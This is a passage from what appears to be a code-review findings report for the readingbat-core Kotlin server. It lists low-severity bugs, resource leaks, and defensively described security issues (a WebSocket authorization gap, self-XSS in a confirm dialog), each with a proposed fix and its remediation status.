  error("Invalid type returned for $challengeName [${correctAnswers::class.java.simpleName}]")
```

Or fold it into a single safe message: `error("Invalid type returned for $challengeName [${correctAnswers?.let { it::class.java.simpleName } ?: "null"}]")`. Either way the descriptive IllegalStateException is preserved instead of an NPE. (Note: the `== null` check needs a suppression because the declared type is non-null `Any`, not `Any?` as the finding stated — the null can only arrive via the platform-type leak from engine.eval.)

## 31. 🟡 LOW — extractJavaFunction throws on source with fewer than two 'static' lines

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** bug | **Subsystem:** dsl-script-eval | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/parse/JavaParse.kt:84-87`

**Problem:** extractJavaFunction computes `lineNums = code.indices.filter { code[it].contains(staticRegex) }` then returns `code.subList(lineNums.first(), lineNums.last() - 1)`. If no line matches staticRegex, `lineNums.first()` throws NoSuchElementException. If exactly one line matches (first == last), `subList(n, n-1)` throws IllegalArgumentException because fromIndex > toIndex. Both produce an opaque crash during content load rather than a meaningful 'malformed challenge' message. Even with two matches at adjacent indices the `last() - 1` arithmetic can yield fromIndex == toIndex (empty body) or invert.

**Fix:** Pass the challenge name and validate before slicing, matching the codebase's existing named-error pattern (deriveJavaReturnType, validate()). Change the signature to accept ChallengeName and guard the two real crash cases (zero or one static line):

  fun extractJavaFunction(challengeName: ChallengeName, code: List<String>): String {
    val lineNums = code.indices.filter { code[it].contains(staticRegex) }
    if (lineNums.size < 2)
      error("In $challengeName: expected at least two 'static' method declarations " +
            "(challenge function and main), found ${lineNums.size}")
    return code.subList(lineNums.first(), lineNums.last() - 1).joinToString("\n").trimIndent()
  }

Update the caller at Challenge.kt:245 to `JavaParse.extractJavaFunction(challengeName, lines)`. Note: the `lineNums.last() - 1 > lineNums.first()` guard suggested in the finding is unnecessary because with two distinct matches subList is always valid (and an empty result is acceptable); the size < 2 check alone covers both genuine crash cases.

## 32. 🟡 LOW — Per-user answer channels are never removed, unbounded map growth

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** resource-leak | **Subsystem:** posts-answers | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/posts/UserAnswerQueue.kt:55-72`

**Problem:** userChannels is a `ConcurrentHashMap<Long, Channel<AnswerJob<*>>>` populated via computeIfAbsent on every first answer submission for a user, and nothing ever removes entries or closes channels. Each entry also keeps a long-lived consumer coroutine alive (`scope.launch(...) { for (job in ch) ... }`) for the process lifetime. On a site with many distinct students over time, the map and the set of idle consumer coroutines grow without bound (one channel + one coroutine retained per distinct userDbmsId forever), a slow memory/coroutine leak.

**Fix:** Bound the lifetime of per-user channels so idle users are evicted. Concrete options: (1) Replace the unbounded ConcurrentHashMap with an expiring/size-capped cache (e.g. Caffeine with expireAfterAccess and a removalListener that calls channel.close() so the consumer coroutine's `for (job in ch)` loop exits and the coroutine completes); on a cache miss a fresh channel + coroutine is recreated on demand. (2) Alternatively, shard work across a fixed-size pool of N worker coroutines/channels keyed by `userDbmsId % N`, eliminating per-user allocation entirely while still serializing each user's writes onto a deterministic single worker. Either approach must ensure the channel is closed on eviction so the launched coroutine terminates (closing the channel alone is sufficient since the consumer iterates with `for (job in ch)`). At minimum, document the bound and add a gauge/metric on userChannels.size so growth can be monitored.

## 33. 🟡 LOW — Logging WebSocket only requires any valid user, not an admin, to subscribe to admin operational logs

- [x] **Addressed** — PR #107

- **Category:** security | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/LoggingWs.kt:176-205`

**Problem:** The logging endpoint authorizes via `validateLogContext(user)` (line 194), which (WsCommon.kt lines 116-120) only rejects when `user.isNotValidUser()` — i.e. any authenticated, valid user passes. The matching filter is solely the client-supplied `logId` path parameter (line 191; logId comes straight from the request, see SysAdminRoutes.kt logId() lines 65-68). The admin POST endpoints that drive these logs are all gated with `authenticateAdminUser` (SysAdminRoutes.kt lines 112, 136, 148, 158, 171) and an `isAdminUser()` check exists (User.kt line 714), but the WS that streams the resulting log output applies no such gate. A valid non-admin user who learns/guesses a logId can subscribe to the admin command log stream (DSL reset stats, challenge-load output, cache/GC diagnostics). The authorization on this channel is strictly weaker than on the operations it mirrors.

**Fix:** Align the logging WS authorization with the admin-only POST routes it mirrors. In WsCommon.kt validateLogContext, additionally require admin: change the when to reject non-admins, e.g.:

fun validateLogContext(user: User) =
  when {
    user.isNotValidUser() -> false to "Invalid user id: ${user.userId}"
    user.isNotAdminUser() -> false to "Must be system admin for this function"
    else -> true to ""
  }.also { (valid, msg) -> if (!valid) throw InvalidRequestException(msg) }

(import com.readingbat.common.isNotAdminUser). Alternatively, in LoggingWs.kt:194 add an explicit `if (user.isNotAdminUser()) throw InvalidRequestException("Must be system admin")` before binding logId, matching authenticateAdminUser used by the SysAdmin routes. The random-per-session logId already provides a meaningful practical barrier, so this is hardening/defense-in-depth rather than closing an easily exploitable hole.

## 34. 🟡 LOW — Validation/lookup failures close the WebSocket as a generic GOING_AWAY with no error feedback to the client

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** error-handling | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/ChallengeGroupWs.kt:85-205`

**Problem:** Inside measureEndpointRequest the handler can throw InvalidRequestException from validateContext (line 98), from missing params (lines 89-91), or from content.findGroup (line 92) when the language/group is unknown. measureEndpointRequest only has a finally and re-throws (Metrics.kt lines 281-288), so the exception unwinds into the ws handler's finally (lines 199-205), which closes with `CloseReason(GOING_AWAY, "Client disconnected")` (line 202) and logs nothing about the actual cause. The teacher's client cannot distinguish an authorization rejection (not your class), an invalid class code, or an unknown group from a normal disconnect, and the failure is not logged at this layer. The same pattern applies to ChallengeWs, ClassSummaryWs, and StudentSummaryWs finally blocks.

**Fix:** Wrap the measureEndpointRequest body (or add a catch around it) in each of the four teacher-facing WS handlers (ChallengeGroupWs, ClassSummaryWs, StudentSummaryWs, ChallengeWs) to log the cause and close with a distinct reason, e.g.:

try {
  metrics.measureEndpointRequest("/websocket_class_statistics") { ... }
} catch (e: InvalidRequestException) {
  logger.info { "Rejected class statistics websocket: ${e.message}" }
  close(CloseReason(CloseReason.Codes.VIOLATED_POLICY, e.message ?: "Invalid request"))
}

Keep the existing finally for normal teardown (closeChannels, gauge.dec, debug log); the close() in finally is a no-op once already closed. The primary value is the logger line for operator visibility; the distinct close code is forward-looking since the current JS client ignores close.reason/code and simply reconnects -- to make client feedback real, the onclose handlers (e.g. ChallengePage.kt:377) would also need to inspect event.code/event.reason and stop the reconnect loop on a policy violation. A shared helper in WsCommon would avoid duplicating this across all four handlers.

## 35. 🟡 LOW — Teacher-ownership check calls fetchClassTeacherId() twice (extra DB round-trip on every connection)

- [x] **Addressed** — PR #114

- **Category:** performance | **Subsystem:** websockets | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ws/WsCommon.kt:106-109`

**Problem:** In validateContext the final guard evaluates `classCode.fetchClassTeacherId() != user.userId` (line 106) and then, inside the failure branch, calls `classCode.fetchClassTeacherId()` a second time to build the message (line 107). fetchClassTeacherId is a DB lookup (referenced from ClassCodeRepository), so the unauthorized path performs two queries for the same value, and even the success path has already paid for one lookup that is discarded. This runs on every teacher WebSocket connection setup.

**Fix:** Hoist the value once before the when-branch and reuse it. Replace lines 106-109 with:
  classCode.fetchClassTeacherId().let { teacherId -> teacherId != user.userId } -> ...
Better, since the value is only needed inside this branch, compute it in the condition and reuse via a local. The cleanest within the existing when structure:

  classCode.fetchClassTeacherId().let { it != user.userId } -> {
    false to "User id ${user.userId} does not match class code's teacher Id ${classCode.fetchClassTeacherId()}"
  }
— but that still double-calls. The correct fix is to compute it once outside the when (matching the suggested fix):

  val teacherId = classCode.fetchClassTeacherId()
  ...
  teacherId != user.userId ->
    false to "User id ${user.userId} does not match class code's teacher Id $teacherId"

Note: moving the lookup unconditionally before the when would make it run even when earlier guards (invalid language/group/classCode, not-enrolled, etc.) would short-circuit first, adding a query on those paths. To avoid that regression, keep the lookup lazy by computing it only at this branch, e.g. introduce a single-eval helper or restructure so the value is fetched once at branch entry. Simplest safe form that preserves short-circuiting and removes the redundant second call:

  else -> {
    val teacherId = classCode.fetchClassTeacherId()
    if (teacherId != user.userId)
      false to "User id ${user.userId} does not match class code's teacher Id $teacherId"
    else
      true to ""
  }
This fetches exactly once, only when all prior guards pass, and eliminates the duplicate call.

## 36. 🟡 LOW — geoInfoMap caches failed/blank lookups permanently and is never evicted (unbounded growth + permanent poisoning)

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** resource-leak | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/GeoInfo.kt:168-183`

**Problem:** On API failure, lookupGeoInfo() stores GeoInfo(true, -1, ipAddress, "") with blank json into geoInfoMap via getOrPut (lines 170,177). The map is never cleared or bounded in production (grep shows clear() only in GeoInfoCacheTest; Metrics.kt and SystemConfigurationPage only read .size). Consequences: (1) a transient ipgeolocation.io outage permanently caches a blank/Unknown geo entry for that IP, so it never retries and its summary() is always Constants.UNKNOWN; (2) the map grows one entry per distinct client IP for the lifetime of the process with no eviction, an unbounded memory growth on a public-facing server. The blank entry is also inserted into geo_info (valid=false branch skips all geo columns but still writes ip + empty json), persisting useless rows.

**Fix:** Two targeted changes in lookupGeoInfo (GeoInfo.kt lines 168-183):

1) Do not cache transient failures so the next request retries. In the getOrElse failure branch, still insert/return a GeoInfo for this request, but remove the key from geoInfoMap before returning (or restructure so getOrPut is not used for the failure path), e.g. compute the result and on failure call geoInfoMap.remove(ipAddress) after the block, so a later API recovery is picked up. Consider also not writing a blank row to geo_info on failure (or marking it so it can be refreshed), since the valid=false row persists an empty json.

2) Bound the cache. Replace the raw ConcurrentHashMap (line 139) with a size-capped/LRU structure (e.g. a Caffeine cache with maximumSize and optional expireAfterWrite) since the key space is unbounded client IPs. Keep the Metrics/SystemConfigurationPage .size reads working by exposing an equivalent size accessor.

## 37. 🟡 LOW — geoInfosUnique Index declares the wrong column (id) vs. the real DB constraint on ip

- [x] **Addressed** — fixed in PR #94

- **Category:** correctness | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/PostgresTables.kt:43`

**Problem:** geoInfosUnique = Index(listOf(GeoInfosTable.id), true, "geo_info_unique"), but migration V001__create_base_tables.sql:146 defines `CONSTRAINT geo_info_unique unique (ip)` — the constraint is on ip, not id. This Index is passed to upsert(conflictIndex = geoInfosUnique) in GeoInfo.insert() (GeoInfo.kt:104). UpsertStatement.prepareSQL uses conflictIndex.columns to decide which columns to EXCLUDE from the DO UPDATE SET list (UpsertStatement.kt:107). Listing `id` here means `id` is (correctly) not updated, but `ip` is wrongly included in the SET list and the index object misrepresents the schema. It only works by accident because the emitted SQL references the constraint by name (ON CONFLICT ON CONSTRAINT geo_info_unique). If anyone ever switches upsert to use conflictColumn semantics, calls Exposed schema validation/creation (SchemaUtils) against this Index, or the constraint is recreated from the Kotlin model, conflict detection will target id (always unique on insert) and the upsert will silently degrade to duplicate INSERTs per IP.

**Fix:** In /Users/pambrose/git/readingbat/readingbat-core/readingbat-core/src/main/kotlin/com/readingbat/server/PostgresTables.kt:43 change `val geoInfosUnique = Index(listOf(GeoInfosTable.id), true, "geo_info_unique")` to `val geoInfosUnique = Index(listOf(GeoInfosTable.ip), true, "geo_info_unique")`. This makes the in-memory Index agree with the migration's `CONSTRAINT geo_info_unique unique (ip)`, matches the convention used by the other index objects in the file, and causes UpsertStatement.prepareSQL to correctly exclude `ip` from the `DO UPDATE SET` list (dropping the redundant `ip=EXCLUDED.ip` no-op). Behavior at runtime is unchanged today, but the model now correctly represents the schema. No DB migration change needed; the constraint name and target column already match.

## 38. 🟡 LOW — Request-logging interceptor opens 3-4 separate transactions per request

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** performance | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/Intercepts.kt:237-269`

**Problem:** The Plugins intercept (runs on every non-static request when save-requests is enabled) opens multiple independent JDBC transactions for a single request: findOrCreateSessionDbmsId in its own transaction{} (line 237); lookupGeoInfo() which internally opens a readonlyTx (queryGeoInfo) and possibly an insert transaction; a second queryGeoInfo when requireDbmsLookUp is true (line 249, see finding above); and finally the ServerRequestsTable insert in another transaction{} (line 255). Each transaction grabs a HikariCP connection from the pool and (given the REPEATABLE_READ isolation configured in ReadingBatServer.kt:146) starts a real snapshot. Under load this multiplies pool checkouts and round-trips 3-4x per request purely for request logging, increasing latency and pool pressure.

**Fix:** Coalesce the blocking DB work into a single transaction{} block, but keep the suspend lookupGeoInfo() call OUTSIDE it (it performs an HTTP call and must not run inside a blocking JDBC transaction). Concretely:

1. Call val geoInfo = lookupGeoInfo(ipAddress) first (unchanged, outside any transaction).
2. Then wrap the session lookup, the conditional geo-id resolution, and the insert in one transaction{}:

   transaction {
     val sessionDbmsId = findOrCreateSessionDbmsId(browserSession.id, true)
     val geoDbmsId =
       if (geoInfo.requireDbmsLookUp)
         queryGeoInfo(ipAddress)?.dbmsId ?: error("Missing ip address: $ipAddress")
       else
         geoInfo.dbmsId
     with(ServerRequestsTable) { insert { ... } }
   }

   (findOrCreateSessionDbmsId/querySessionDbmsId already use readonlyTx which will nest into this outer transaction and reuse its connection; queryGeoInfo's readonlyTx likewise nests. This reduces the per-request connection checkouts to one.)

Additionally, addressing the related requireDbmsLookUp finding (caching GeoInfo with the actual dbmsId after an API insert so requireDbmsLookUp becomes false) would eliminate the line-249 query outright for API-resolved IPs.

## 39. 🟡 LOW — Background content load has no failure handling; a load exception leaves the server permanently 'not ready'

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** error-handling | **Subsystem:** db-layer | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/server/ReadingBatServer.kt:301-317`

**Problem:** readContentDsl is launched fire-and-forget on Dispatchers.IO (line 306). markContentLoaded() is only reached on success (readContentDsl line 258); if DSL read or script eval throws, the coroutine dies, isContentReady stays false forever, and the separate poll loop (lines 309-317) just logs 'Content not loaded after Ns' indefinitely with no retry, alert, or process-exit. User-facing routes will serve the loading page forever. The exception is also not logged with a stack trace from here.

**Fix:** Wrap the background load so failures are surfaced and recoverable. Minimal version: `launch(Dispatchers.IO) { try { readContentDsl(dslFileName, dslVariableName) } catch (e: Throwable) { logger.error(e) { "Initial content load failed; server will keep serving the loading page" }; /* optionally: retry with backoff, or exitProcess(1) so an orchestrator restarts the instance */ } }`. Decide between (a) retry-with-backoff to self-heal transient failures, or (b) fail-fast via process exit so the platform restarts the pod/instance — fail-fast is preferable when /ping would otherwise report the instance as healthy while it serves only 503 loading pages. At minimum log the exception with its stack trace from this call site so the recurring 'Content not loaded after Ns' warnings (line 315) are explained.

## 40. 🟡 LOW — Self-XSS / broken confirm dialog from email interpolated into onSubmit JS string

- [x] **Addressed** — PR #110

- **Category:** security | **Subsystem:** pages-large | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/UserPrefsPage.kt:302`

**Problem:** `onSubmit = "return confirm('Are you sure you want to permanently delete the account for $email ?')"` interpolates the user's email (Email.value, set from OAuth/registration with only `maxLength(128)`, User.kt:675) into a single-quoted JS string. As in the StudentSummaryPage case, a single quote in the value (e.g. an attacker-influenced OAuth display value, or simply a malformed/edge-case email) escapes the confirm() literal and either breaks the delete-account button or executes injected JS in the account owner's session. Lower severity than the teacher case because the value is normally the victim's own email, but the same unsafe pattern and it silently breaks the confirmation guard on the destructive delete-account action. The withdraw-from-class confirm on line 200 ($displayStr) shares the pattern with lower-risk input.

**Fix:** Do not interpolate the email into the JS string literal. Use a fixed confirmation message and rely on the already-escaped surrounding HTML (line 298 `p { +"Permanently delete account [$email] ..." }`, which is safe because tag content escaping plus the user reading their own email is sufficient context). For example: `onSubmit = "return confirm('Are you sure you want to permanently delete this account? This cannot be undone.')"`.

If the email must appear in the dialog, JS-escape it first. Add a shared helper, e.g. `fun jsString(s: String) = s.replace("\\", "\\\\").replace("'", "\\'").replace("\"", "\\\"").replace("<", "\\x3C").replace("\n", "\\n").replace("\r", "")` and use `confirm('... for ${jsString(email.toString())} ?')`. Note kotlinx-html will still HTML-escape `<`/`&`/`"` in the attribute, so the helper must complement (not replace) that — escaping `'` is the essential missing piece.

Apply the same fix to the sibling call sites that share this pattern: UserPrefsPage.kt:200 (`$displayStr`), StudentSummaryPage.kt:173 (`$studentName`), and any analogous confirm() onSubmit handlers in ChallengePage/TeacherPrefsPage/ChallengeGroupPage. The StudentSummaryPage one (a teacher viewing a student-controlled name in the teacher's session) is the higher-severity instance and should be prioritized.

## 41. 🟡 LOW — WebSocket client boilerplate duplicated across three page objects

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** design | **Subsystem:** pages-large | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/ChallengePage.kt:348-480`

**Problem:** The https->wss / http->ws origin-rewrite block is copy-pasted verbatim in three places (ChallengePage.enableWebSockets lines 360-364, ClassSummaryPage.enableWebSockets lines 449-453, StudentSummaryPage.enableWebSockets lines 257-261). The onmessage results loop in ClassSummaryPage (462-476) and StudentSummaryPage (270-284) is also nearly identical — same YES/NO color logic, same `-stats` / `-likeDislike` element-id update pattern, differing only by whether the id prefix uses CHALLENGE_NAME_FIELD alone or GROUP_NAME_FIELD+CHALLENGE_NAME_FIELD. This triplicated JS-in-Kotlin is hard to keep consistent (StudentSummaryPage line 283 even has a misaligned brace from a past hand-edit) and any color/protocol change must be made in three spots.

**Fix:** Add a shared helper to the existing PageUtils object (PageUtils.kt) that emits the WebSocket origin-rewrite + connection boilerplate once. For example: `fun wsHostRewriteJs(): String` returning the verbatim `var wshost = location.origin; if (wshost.startsWith('https:')) wshost = wshost.replace(/^https:/, 'wss:'); else wshost = wshost.replace(/^http:/, 'ws:');` block, and interpolate `${PageUtils.wsHostRewriteJs()}` into all six rawHtml scripts (ChallengePage:360, ClassSummaryPage:449, StudentSummaryPage:257, ClockPage:52, SystemAdminPage:216, ChallengeGroupPage:211). Separately, factor the two summary-page onmessage loops into a single helper parameterized by the prefix-source expression (USER_ID_FIELD vs GROUP_NAME_FIELD), e.g. `fun summaryOnMessageJs(prefixField: String): String`, collapsing ClassSummaryPage (462-476) and StudentSummaryPage (270-284) into one source of truth for the YES/NO color logic and the -stats/-likeDislike updates. While editing, fix the misaligned brace at StudentSummaryPage.kt line 283. Scope note: the finding says three pages; the origin-rewrite duplication is actually six, so the helper should be applied to all six call sites for full benefit.

## 42. 🟡 LOW — displayStudentProgress mixes data aggregation with rendering in one ~100-line function

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** design | **Subsystem:** pages-large | **Verifier confidence:** medium
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/ChallengePage.kt:439-539`

**Problem:** BODY.displayStudentProgress both (a) performs per-enrollee data work — `enrollee.answerHistoryBulk(challengeMd5s)`, building the md5 list, counting numCorrect, deriving allCorrect (lines 475-494) — and (b) renders the full nested table with inline color logic duplicated from the WS handler (CORRECT_COLOR/INCOMPLETE_COLOR/WRONG_COLOR appears both here at 499/519-524 and in the JS at 419/426-428). The color-selection rule for an answer cell is expressed once in Kotlin and again in JavaScript with no shared source, so they can diverge. The function is also doing a DB-style fetch (answerHistoryBulk) per enrollee inside the render loop.

**Fix:** Split the function into a small data pass and a render pass. Before the kotlinx.html block, build a list of per-enrollee view-model rows (e.g. `data class EnrolleeRow(val enrollee: User, val numCorrect: Int, val numCalls: Int, val allCorrect: Boolean, val results: List<Pair<Invocation, ChallengeHistory>>)`) by iterating enrollees once, calling `answerHistoryBulk` and computing numCorrect/allCorrect there; then have the `table { }` block render purely from that list. This removes the DB-style fetch from the render loop and isolates aggregation from markup. For the color logic, extract one Kotlin helper for the server side (e.g. `fun answerCellColor(history: ChallengeHistory)` and `fun nameCellColor(allCorrect: Boolean)`) used at lines 499 and 519-524 so the server-side rule lives in one place. Do NOT claim the same function can be shared with the WS JS handler — that is a different runtime; instead, if drift between the Kotlin rule and the JS ternary (419/426-428) is a concern, add a comment cross-referencing the two locations (and the matching blocks in ClassSummaryPage/StudentSummaryPage), or generate the JS ternary from the same constants. Given this is low severity and an established codebase pattern, the data/render split is the higher-value part; the color extraction is optional polish.

## 43. 🟡 LOW — Duplicate DB lookup of class teacher id in authorization check

- [x] **Addressed** — PR #114

- **Category:** performance | **Subsystem:** pages-large | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/pages/ClassSummaryPage.kt:136-139`

**Problem:** In the authorization `when`, `classCode.fetchClassTeacherId()` is called on line 136 for the comparison and then called a second time on line 137 to build the error message. fetchClassTeacherId is a repository/DB call (ClassCodeRepository), so the common branch issues the query once but the failure branch issues it twice. The identical pattern is repeated in StudentSummaryPage.kt:112-113.

**Fix:** Hoist the lookup once before the `when` and reuse it in both the comparison and the message. In ClassSummaryPage.kt and StudentSummaryPage.kt (and ideally WsCommon.kt:106-107 too):

```kotlin
val teacherId = classCode.fetchClassTeacherId()
when {
  classCode.isNotValid() -> throw InvalidRequestException("Invalid class code: $classCode")
  user.isNotValidUser() -> throw InvalidRequestException("Invalid user")
  teacherId != user.userId ->
    throw InvalidRequestException("User id ${user.userId} does not match class code's teacher id $teacherId")
  else -> { /* Do nothing */ }
}
```

Minor caveat: hoisting above the `when` runs the query even when `classCode.isNotValid()` or `user.isNotValidUser()` would short-circuit, so to strictly preserve the original ordering, place the `val teacherId = classCode.fetchClassTeacherId()` assignment inside the mismatch branch and reference it both for the comparison and message — but Kotlin's `when` cannot bind a val mid-branch for the condition, so the clean approach is to hoist it (the two preceding branches are cheap validity checks and the extra query on those rare invalid paths is harmless), or restructure into if/else. Either way the redundant second query is eliminated.

## 44. 🟡 LOW — errorOnNonInit guard is global, not per-property, so omitted properties silently use defaults

- [x] **Addressed** — branch `fix-lows-batch-3`: safe per-property guard landed (setProperty records the name; reads check `isInitialized()` = global flag OR this property individually set — strictly more permissive than the old global flag, so it never throws where the old guard didn't). The earlier `isTesting` sub-fix landed on PR #114. The full per-property *throwing* guard remains declined as unsafe (it would break `getRequiredProperty()` reads of properties set outside `initProperties()`, e.g. CONFIG_FILENAME/AGENT_LAUNCH_ID); the finding notes no functional bug.

- **Category:** design | **Subsystem:** config-server | **Verifier confidence:** medium
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/Property.kt:81-100, 124-147, 272-273`

**Problem:** `initialized` is a single companion-level AtomicBoolean (line 126), flipped to true once by `assignProperties` -> `assignInitialized()` (lines 130, 142-147). All the `getProperty(...)` overloads guard with `if (errorOnNonInit && !initialized.load()) error(notInitialized(this))` (lines 83, 89, 95, 100, 105) using that single shared flag. This means the 'not initialized' check only detects reads that happen before ANY property is initialized; it can never detect a specific property that was left out of `Property.initProperties()` (lines 438-475). Several properties that are read at runtime are not in that list and thus never get an init value: IS_TESTING (read at ContentDsl.kt:111 via `getProperty(false)`), REDIRECT_HOSTNAME, MAX_HISTORY_LENGTH, MAX_CLASS_COUNT, FORWARDED_ENABLED, XFORWARDED_ENABLED. They silently fall back to the caller-supplied default instead of the configured HOCON value (REDIRECT_HOSTNAME/FORWARDED/XFORWARDED happen to read via configValue/getEnv so are fine, but IS_TESTING reading via getProperty would never reflect a configStore value and the guard gives a false sense of safety). The error message `notInitialized` naming a specific property is misleading because it can never fire for that property.

**Fix:** Make the init guard per-property so the notInitialized error is meaningful and future getProperty-based properties cannot be silently omitted. Replace the single `initialized: AtomicBoolean` with a thread-safe set of initialized property names, populate it in assignProperties (or in setProperty/initProperty), and have each getProperty overload check `propertyName` membership rather than a global flag. Better still, drive initProperties() from the existing `instances` list (values()) — or assert at startup that every Property singleton appears in initProperties() — so omission is impossible. Note this is a defensive/design improvement: there is no current functional bug, since the only getProperty-read property missing from the list (IS_TESTING) is correctly defaulted to false in production and set via setProperty in tests, and the other omitted properties intentionally read straight from HOCON via configValue().

## 45. 🟡 LOW — repo getter's 'missing a repo value' guard is dead code

- [x] **Addressed** — PR #114

- **Category:** correctness | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/LanguageGroup.kt:58-63`

**Problem:** The repo property is initialized to content.repo (line 58), and ReadingBatContent.repo defaults to FileSystemSource("./") (ReadingBatContent.kt line 108). The custom getter throws error("$languageName section is missing a repo value") only when field == defaultContentRoot (lines 60-61), but defaultContentRoot (the sentinel object defined at lines 149-160) is never assigned to repo anywhere in the codebase (grep confirms no assignment). So the guard can never fire: a LanguageGroup that never sets its own repo silently resolves to FileSystemSource("./") instead of producing the intended 'missing a repo value' error. The KDoc claim 'Must be set to a valid source before challenges are loaded' is therefore unenforced.

**Fix:** Treat this as dead-code cleanup, not a behavior change. Remove the unreachable guard and the unused sentinel rather than rewiring initialization (the finding's suggested initialization to defaultContentRoot is harmful — it would break documented per-language repo inheritance and make Content.kt's unset language blocks throw).

In LanguageGroup.kt, simplify the property to:
```kotlin
var repo: ContentRoot = content.repo  // Defaults to outer-level value
```
(drop the custom getter at lines 59-63), and delete the now-unused `defaultContentRoot` object in the companion (lines 149-160). Also fix the misleading KDoc on line 56: replace "Must be set to a valid source before challenges are loaded." with text reflecting that it inherits the parent's repo default unless overridden.

## 46. 🟡 LOW — equalsAsPythonList silently swallows all non-ScriptException errors with no logging

- [x] **Addressed** — obsoleted by #3 (PR #96)

- **Category:** error-handling | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/FunctionInfo.kt:295-306`

**Problem:** In the getOrElse handler, only ScriptException is logged (lines 297-300). The else branch (lines 302-304) catches every other Throwable — including the IllegalArgumentException that AbstractExprEvaluator.eval throws when the Python expression does not evaluate to a Boolean, plus any pool/engine/interrupt failures — and returns `false to deriveHint()` with no log line at all. A genuine engine malfunction or a logic error producing a non-Boolean comparison is indistinguishable from a wrong answer, and there is zero diagnostic trail. This hides real failures behind 'incorrect answer' UX.

**Fix:** Add a log line to the else branch so genuine non-ScriptException failures (e.g., the ClassCastException from `as Boolean` on a non-Boolean eval result, or pool/engine failures) leave a diagnostic trail, and rethrow CancellationException since this is a suspend function:\n\n```kotlin
}.getOrElse { e ->
  when (e) {
    is CancellationException -> throw e
    is ScriptException -> {
      logger.info { \"Caught exception comparing $this and $correctAnswer: ${e.message} in: $compareExpr\" }
      false to deriveHint()
    }
    else -> {
      logger.warn(e) { \"Unexpected error comparing $this and $correctAnswer in: $compareExpr\" }
      false to deriveHint()
    }
  }
}
```\n\nNote: for full consistency, the same warn-logging could be applied to the equalsAsJvmScalar and equalsAsPythonScalar getOrElse blocks (lines 354-356, 395-397), which currently swallow all errors with no logging whatsoever.

## 47. 🟡 LOW — pythonAdjust mis-parses list elements containing commas or non-single-quote quoting

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** correctness | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/common/FunctionInfo.kt:107-113`

**Problem:** pythonAdjust normalizes Python list answers by stripping the outer [ ], splitting on "," (line 110), then removeSurrounding("'") on each element (line 111). Any element that legitimately contains a comma (e.g. a string 'a,b') is split into two elements, and elements quoted with double quotes (or unquoted) are not unquoted consistently — removeSurrounding("'") only strips single quotes. This silently corrupts the formatted correct answer for such challenges, making correct user input register as wrong. The naive split is also used for the empty-list case via the isEmpty() guard (line 110), which is fine, but the comma split is the core fragility.

**Fix:** Replace the naive bracket-strip + split(",") with a quote-aware tokenizer for Python list elements so embedded commas inside quoted strings are not split. A minimal approach: parse the element list respecting single/double quotes (track an in-quote state and only split on top-level commas), then strip matching surrounding quotes of either kind (removeSurrounding("'") or removeSurrounding("\"")) before re-quoting. Apply the same quote-aware tokenizer to parseListElements (lines 283-286), which shares the identical split(",") fragility for the JVM list path. If full parsing is deemed overkill, at minimum document/constrain that content authors must not return Python string list/array answers containing commas, and unquote both single- and double-quoted elements consistently.

## 48. 🟡 LOW — evalContent logs a misleading subject and swallows DSL evaluation failures into an empty content object

- [x] **Addressed** — branch `fix-lows-batch-3`

- **Category:** error-handling | **Subsystem:** utils-misc | **Verifier confidence:** high
- **Location:** `readingbat-core/src/main/kotlin/com/readingbat/dsl/ReadingBatContent.kt:259-262`

**Problem:** When DSL evaluation fails, getOrElse logs `logger.error(e) { "While evaluating: $this" }` (line 260). `$this` is the current ReadingBatContent (whose toString is Content(languageList=[...])), not the contentSource/src that actually failed to evaluate, so the log does not identify which content source broke. The handler then returns a fresh empty ReadingBatContent() (line 261). Swallowing remote-code failures is intentional per the comment, but the operator is left without the source identity needed to diagnose, and callers silently receive empty content.

**Fix:** Log the failing source identity (already in scope as `contentSource.source` / `src`) instead of `$this`, and optionally surface an observable signal. Minimal change at lines 259-261:

```kotlin
}.getOrElse { e ->
  logger.error(e) { "While evaluating content source: ${contentSource.source.ifEmpty { "<local>" }}" }
  ReadingBatContent()
}
```

Optionally increment a Prometheus counter / emit a warn-level health marker so a silently-empty remote content load is observable rather than only appearing as an info-then-error log pair.

---
## Rejected on verification (not real / not worthwhile)

- `Cookies.kt:47-53` — Non-synchronized session-id creation plus missing unique index creates duplicate browser_sessions rows
- `ClassCodeRepository.kt:105-122` — addEnrollee/removeEnrollee inconsistent transaction wrapping
- `ServerUtils.kt:61-64` — safeRedirectPath does not decode percent-encoding before validating
- `Installs.kt:206-210` — Client-supplied X-Request-Id is trusted as the callId and used as a DB key, enabling request-log poisoning
